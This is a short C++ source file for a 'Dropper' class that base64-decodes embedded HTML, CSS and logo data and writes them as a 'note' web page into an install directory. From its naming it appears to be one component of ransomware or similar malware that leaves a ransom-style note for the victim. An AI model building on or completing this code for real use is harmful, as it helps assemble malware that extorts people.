#include "dropper.h"

#include <string>
#include <fstream>

#include "note.h"
#include "util.h"

using std::string;
using std::ofstream;
using string_util::Base64Decode;

const string Dropper::kHtmlFilename_ = "index.html";
const string Dropper::kCssFilename_ = "styles.css";
const string Dropper::kLogoFilename_ = "logo.png";

Dropper::Dropper(const string& install_path) {
  install_path_ = (install_path.back() == '/') ? install_path : install_path + '/';
}


void Dropper::DropNote() const {
  ofstream fout(install_path_ + kHtmlFilename_);
  fout << Base64Decode(note::html);
  fout.close();

  fout.open(install_path_ + kCssFilename_);
  fout << Base64Decode(note::css);
  fout.close();

  fout.open(install_path_ + kLogoFilename_);
  fout << Base64Decode(note::logo);
  fout.close();
}
